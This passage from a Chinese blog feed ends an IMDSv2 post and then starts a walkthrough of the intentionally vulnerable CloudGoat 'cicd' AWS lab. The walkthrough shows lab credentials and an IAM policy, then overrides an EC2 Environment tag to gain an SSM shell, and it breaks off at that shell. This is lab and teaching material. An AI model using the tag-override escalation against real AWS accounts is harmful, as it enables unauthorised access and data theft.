&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enabled&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;InstanceMetadataTags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;disabled&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;优先级规则：实例设置 &amp;gt; 区域设置 &amp;gt; AMI设置 &amp;gt; 默认不启用。&lt;/p&gt;
&lt;h4 id=&#34;terraform集成&#34;&gt;Terraform集成
&lt;/h4&gt;&lt;p&gt;通过&lt;code&gt;aws_ec2_instance_metadata_defaults&lt;/code&gt;资源实现：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-hcl&#34; data-lang=&#34;hcl&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;resource&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;aws_ec2_instance_metadata_defaults&amp;#34; &amp;#34;imdsv2&amp;#34;&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_tokens&lt;/span&gt;                 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;required&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  instance_metadata_tags&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;disabled&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_endpoint&lt;/span&gt;               &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;enabled&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_put_response_hop_limit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;注意事项&#34;&gt;注意事项
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;2024年中起，新型EC2实例将默认仅支持IMDSv2&lt;/li&gt;
&lt;li&gt;该功能仅设置默认值，仍需配合SCP或&lt;code&gt;ec2:MetadataHttpTokens&lt;/code&gt;条件键进行强制管控&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这项功能为云安全实践者提供了重要的管控工具，但AWS仍需进一步改进默认安全配置。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>构建易受攻击的AWS DevOps环境作为CloudGoat场景</title>
        <link>http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/</link>
        <pubDate>Sat, 02 Aug 2025 17:27:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/</guid>
        <description>&lt;h1 id=&#34;构建易受攻击的aws-devops环境作为cloudgoat场景&#34;&gt;构建易受攻击的AWS DevOps环境作为CloudGoat场景
&lt;/h1&gt;&lt;p&gt;我是可丢弃安全实验室的忠实粉丝，无论是用于攻击还是防御目的（参见：在Azure中自动化配置Active Directory实验室）。在撰写《云安全漏洞与破坏：2021年回顾》之后，我想构建一个&amp;quot;故意设计为易受攻击的AWS实验室&amp;quot;，包含典型的攻击路径，包括静态、长期有效的凭证和供应链安全元素。&lt;/p&gt;
&lt;h2 id=&#34;cloudgoat易受攻击的aws环境&#34;&gt;CloudGoat：易受攻击的AWS环境
&lt;/h2&gt;&lt;p&gt;CloudGoat是一个开源项目，包含一系列易受攻击的AWS环境，可以使用Python封装的Terraform在您自己的AWS账户中轻松创建。每个场景都有一个专用文件夹，包含其描述和解决方案。&lt;/p&gt;
&lt;h3 id=&#34;示例cloudgoat场景&#34;&gt;示例CloudGoat场景
&lt;/h3&gt;&lt;p&gt;例如，您可以使用以下命令在AWS账户中启动&lt;code&gt;cicd&lt;/code&gt;场景：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python cloudgoat.py create cicd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此命令将运行Terraform来启动基础设施，并显示开始使用的说明。通常，它会输出一组AWS凭证作为起点。&lt;/p&gt;
&lt;h2 id=&#34;贡献新的cloudgoat场景&#34;&gt;贡献新的CloudGoat场景
&lt;/h2&gt;&lt;p&gt;直接链接：https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cicd&lt;/p&gt;
&lt;h3 id=&#34;场景故事&#34;&gt;场景故事
&lt;/h3&gt;&lt;p&gt;FooCorp是一家提供公共API的公司。FooCorp的客户每分钟都会向以下API端点提交敏感数据：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST {apiUrl}/prod/hello
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: {apiHost}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;superSecretData=...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该API实现为一个Lambda函数，通过API Gateway公开。由于FooCorp实施了DevOps，它有一个持续部署管道，可以在几分钟内自动将Lambda函数的新版本从源代码部署到生产环境。&lt;/p&gt;
&lt;p&gt;您的任务（如果您选择接受）：您将获得一个初始的低权限IAM用户的AWS凭证集。您的目标是窃取提交给FooCorp API的敏感数据。请注意，模拟用户活动正在账户中进行，模拟对FooCorp API的活动。这是通过每分钟运行的AWS CodeBuild项目实现的。&lt;/p&gt;
&lt;p&gt;该场景包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;3个IAM用户&lt;/li&gt;
&lt;li&gt;1个VPC，其中包含一个位于私有子网中的EC2实例&lt;/li&gt;
&lt;li&gt;用于实现API的组件：
&lt;ul&gt;
&lt;li&gt;1个API Gateway&lt;/li&gt;
&lt;li&gt;1个Lambda函数&lt;/li&gt;
&lt;li&gt;1个ECR仓库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用于实现持续部署管道的组件：
&lt;ul&gt;
&lt;li&gt;1个CodePipeline管道&lt;/li&gt;
&lt;li&gt;2个CodeBuild项目&lt;/li&gt;
&lt;li&gt;1个CodeCommit仓库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;foocorp基础设施架构图&#34;&gt;FooCorp基础设施架构图
&lt;/h3&gt;&lt;h3 id=&#34;漏洞利用步骤&#34;&gt;漏洞利用步骤
&lt;/h3&gt;&lt;p&gt;本节包含剧透！只有当您卡住了，或者不打算挑战该场景时才应阅读。点击此处跳过本节继续阅读：使用端到端测试进行持续测试&lt;/p&gt;
&lt;p&gt;当我们通过&lt;code&gt;python3 cloudgoat.py create cicd&lt;/code&gt;实例化场景时，会获得一个初始的AWS IAM访问密钥：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[cloudgoat] terraform apply completed with no error code.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[cloudgoat] terraform output completed with no error code.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_access_key_id = AKIA254BBSG...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_api_url = https://4ybsnrwee1.execute-api.us-east-1.amazonaws.com/prod
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_aws_account_id = 012345678912
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cloudgoat_output_secret_access_key = mjV9uB....
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以设置&lt;code&gt;AWS_ACCESS_KEY_ID&lt;/code&gt;和&lt;code&gt;AWS_SECRET_ACCESS_KEY&lt;/code&gt;环境变量，或使用&lt;code&gt;aws-vault&lt;/code&gt;。我更喜欢后者，因为它可以方便地同时使用CLI和AWS控制台。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws-vault add cloudgoat-step1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter Access Key ID:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter Secret Access Key:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Added credentials to profile &lt;span class=&#34;s2&#34;&gt;&amp;#34;cloudgoat-step1&amp;#34;&lt;/span&gt; in vault
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 使用CLI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws-vault &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; cloudgoat-step1 --no-session
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 打开AWS控制台&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws-vault login cloudgoat-step1 --no-session
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们以名为&lt;code&gt;ec2-sandbox-manager&lt;/code&gt;的用户身份进行身份验证，该用户有一个IAM策略，允许我们管理标记为&lt;code&gt;Environment=dev&lt;/code&gt;的EC2实例的标签，并对标记为&lt;code&gt;Environment=sandbox&lt;/code&gt;的实例执行任何SSM操作。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ec2:CreateTags&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ec2:DeleteTags&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Condition&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;StringLike&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ec2:ResourceTag/Environment&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dev&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ssm:*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;Condition&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;StringLike&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ssm:ResourceTag/Environment&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sandbox&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;有一个EC2实例正在运行，标记为&lt;code&gt;Environment=dev&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;我们的IAM策略不允许我们通过AWS SSM Session Manager访问该实例。但是，我们确实有权限覆盖用于访问控制的&lt;code&gt;Environment&lt;/code&gt;标签：&lt;/p&gt;
&lt;p&gt;然后我们可以访问EC2实例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws ssm start-session --region us-east-1 --target i-030c2cba2ef533829
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting session with SessionId: ec2-sandbox-manager-06e2440aa9ed6f315
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
